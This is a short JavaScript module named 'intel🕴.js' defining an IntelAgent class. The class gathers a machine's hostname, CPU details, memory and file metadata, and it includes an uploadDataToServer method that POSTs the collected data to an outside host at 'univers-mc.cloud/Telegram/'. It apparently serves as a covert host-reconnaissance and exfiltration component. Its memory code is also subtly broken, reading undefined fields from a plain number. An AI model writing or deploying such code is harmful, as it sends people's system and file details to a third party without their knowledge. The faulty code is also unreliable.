// intel🕴.js
const fs = require('fs');
const os = require('os');

class IntelAgent {
  async gatherSystemInfo(
) {
    const cpuInfo = os.cpus();
    const memoryInfo = os.freemem();
    const hostname = os.hostname();

    const systemInfo = {
      hostname,
      cpu: {
        count: cpuInfo.length,
        model: cpuInfo[0].model,
        speed: cpuInfo[0].speed,
      },
      memory: {
        total: memoryInfo.total,
        free: memoryInfo.free,
      },
    };

    return systemInfo;
  }

  async gatherFileInfo(path) {
    const fileInfo = {
      name: path.split(os.sep).pop(),
      size: fs.statSync(path).size,
      modifiedAt: fs.statSync(path).mtime,
    };

    return fileInfo;
  }

  async uploadDataToServer(data) {
    const serverResponse = await fetch('https://univers-mc.cloud/Telegram/', {
      method: 'POST',
      body: JSON.stringify(data),
      headers: { 'Content-Type': 'application/json' },
    });

    return serverResponse.status;
  }
}

module.exports = IntelAgent;
